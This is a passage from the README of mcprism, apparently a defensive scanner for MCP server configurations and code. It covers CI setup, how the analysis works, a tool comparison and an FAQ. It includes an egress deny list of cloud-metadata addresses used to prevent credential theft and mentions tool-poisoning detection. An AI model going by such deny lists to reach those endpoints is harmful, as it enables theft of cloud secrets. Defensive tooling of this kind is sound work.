`suppressions`, `baseline`, or `fail-on` to use your own gate. Its `sarif-file` output can be
passed to the config upload step; `source-sarif-file` is available when
`source-target` is set. Upload the reports with separate categories. The
workflow needs `security-events: write` to publish findings.
When the action is pinned to a release tag, it uses that matching binary
version automatically. Pin to a full commit SHA for stricter supply-chain
protection.

To fail CI when one server's tool definitions change, create a reviewed lock with
`mcprism inventory save mcp.json --output mcp.tools.lock.json`, then set both
`inventory-target` and `inventory-baseline` in the action. This opt-in check
connects to the server to enumerate tools and may launch a stdio process; use a
dedicated runner without secrets.
The composite action supports Linux, macOS, and Windows GitHub-hosted runners.
For Jenkins, GitLab, or other CI systems, use the CLI examples above.

JUnit output works with the test report steps in Jenkins and GitLab, and
CycloneDX output can be handed to an SBOM or vulnerability tracker.

## How it works

```mermaid
flowchart TD
  A[Targets: auto-discover / files / directories / URLs / source trees] --> B[Analysis]
  B --> B1[Config rules<br/>static · capability · supply-chain · network]
  B --> B2[Source SAST<br/>tool args to command · SSRF · path sinks]
  B --> B3[MCP handshake<br/>list tools, resources, prompts; poisoning checks]
  B1 --> D[Policy enforcement<br/>overrides · allow/deny · network isolation]
  B2 --> D
  B3 --> D
  D --> E[Suppressions<br/>accepted risk with reason and expiry]
  E --> F[Score 0-100, grade A-F, compliance gate]
  F --> G[Report<br/>table · json · sarif · md · html · junit · cyclonedx · csv]
```

Static analysis (the default) only reads local config and source files, so it
has no side effects and needs no network. Live probing is opt-in: when you pass
`--dynamic` or `--probe`, mcprism starts or connects to the target server. In
that mode it hands the spawned process a restricted environment (a small
allowlist instead of your full shell; use `--inherit-env` to override) and
applies an egress guard that blocks redirects and dial-out to cloud-metadata
and link-local addresses (169.254.0.0/16, 100.100.100.200, fe80::/10). Even
with those guards, treat an untrusted server as untrusted and probe it inside a
sandbox or VM. Secrets seen on the command line, in URLs or in evidence are
masked in every report format. The bundled demo server (`examples/testserver`)
simulates risky behavior without performing any of it. The package layout and
data flow are described in [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md).

## Comparison

Based on public project descriptions (features may change):

| | **mcprism** | mcp-scan | mcp-audit | manual review |
|---|---|---|---|---|
| Language / runtime | Go, single binary | Python | Python/Node | — |
| Zero install / runtime deps | ✅ | ❌ | ❌ | — |
| Static config review | ✅ | ✅ | partial | ❌ |
| Live capability enumeration | ✅ | partial | partial | ❌ |
| Source-code SAST (handler-to-sink taint) | ✅ | ❌ | ❌ | ❌ |
| Tool-poisoning detection | ✅ | ✅ | partial | ❌ |
| Capability-combination modeling | ✅ | ❌ | ❌ | ❌ |
| Policy as code (allow/deny/isolation) | ✅ | ❌ | ❌ | ❌ |
| JUnit / CycloneDX / CSV output | ✅ | ❌ | ❌ | ❌ |
| Recursive, multi-target scan | ✅ | partial | ❌ | ❌ |
| SARIF + CI exit codes | ✅ | ✅ | ❌ | ❌ |
| Offline local scans, no LLM | ✅ | ✅ | partial | ✅ |
| Cross-platform | ✅ | partial | partial | — |

## FAQ

**Does mcprism call my tools or read my data?**
It never invokes `tools/call`. By default, a live probe only initializes the
server and lists capabilities. With the explicit `--read-content` option, it
also sends `resources/read` and `prompts/get`; a server may return file or other
resource data and rendered prompt text. Use that option only with a trusted
target. Retrieved text stays local and is not saved in reports, although a
matched evidence snippet can be included when a rule fires.

**Do inventory save and verify start the target?**
Yes. They connect to remote servers or start stdio processes to enumerate tool metadata. They never call the tools. Use a sandbox or a dedicated runner without secrets for untrusted targets; the lock contains tool names and hashes only.

**Does it send data anywhere?**
There is no telemetry, and local configs or reports are never uploaded.
`registry search` and `registry audit` send the search term, while `registry scan`
sends the requested server name to the official MCP Registry to fetch public metadata. Other static
scans do not connect anywhere. A live scan (`--dynamic` for scan, `--probe` for
vet) connects to the server you point it at and may start its process; treat it
as untrusted and use a sandbox. Probing refuses cross-host redirects and
connections to cloud-metadata/link-local addresses, and by default does not
pass your shell environment to the spawned server. `--read-content` also asks
the target to read resources and render prompts, so only enable it when that
extra server-side work is appropriate.

**Will my tokens end up in the report?**
No. Credentials in URL userinfo, `--api-key`/`--token` style arguments,
`key=value` pairs, `Bearer` headers and known token prefixes (AWS, GitHub,
Slack, GitLab, OpenAI, JWT) are masked as `***` in the target string and in
finding evidence across all output formats. Detection still runs on the
original values; only the rendered report is redacted.

**How is this different from mcp-scan or mcp-audit?**
Those run on Python or Node and focus on config or poisoning. mcprism is a Go
single binary, models capability combinations, enforces policy as code, and
emits JUnit, CycloneDX and CSV in addition to SARIF. See the
[comparison table](#comparison).

**A finding is a false positive for my setup. What do I do?**
Fix the underlying issue if you can, or suppress it with a reason and an
expiry. Suppressed items stay visible and expire on their own. See
[docs/POLICIES.md](docs/POLICIES.md).

**Does a clean report mean the server is safe?**
No. mcprism reports known, observable risk. It cannot prove a server is safe,
so only run servers you trust.

## Roadmap

- [ ] More rules and fewer false positives as the MCP spec evolves
- [x] MCP registry scanning
- [x] User-defined regex checks in policy files
- [x] Pre-commit hook
- [x] GitHub Actions integration with SARIF output
- [x] VS Code workspace scan extension
- [ ] JetBrains editor integration
- [x] Scoop package
- [x] Homebrew formula
- [x] Nix package
- [x] Rust `rmcp` tool SAST
- [x] Initial C# SAST for official SDK `[McpServerTool]` methods
- [x] Follow uniquely resolved C# helpers across files through concrete-type calls
- [x] Kotlin SDK `server.addTool` callbacks and bounded same-file/imported helper chains
- [ ] Broader data-flow coverage for dynamic dispatch, returned values and
  complex object graphs; current cross-file and helper tracking is bounded and
  language-specific ([details](docs/SAST.md)).
- [ ] Built-in sandbox wrapper for live probes

## Contributing

Issues and PRs are welcome. A good rule contribution is a high-signal,
deterministic check with a low false-positive rate: add it under
`internal/rules`, map it to an OWASP MCP risk, and include a test. The code
layout is in [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md). Run
`go vet ./... && go test ./...` before opening a PR.

## License

[MIT](LICENSE) © mcprism contributors.

mcprism is a defensive tool. It reports risk; it does not prove a server is
safe, and a clean report is not a reason to trust a server you do not understand.


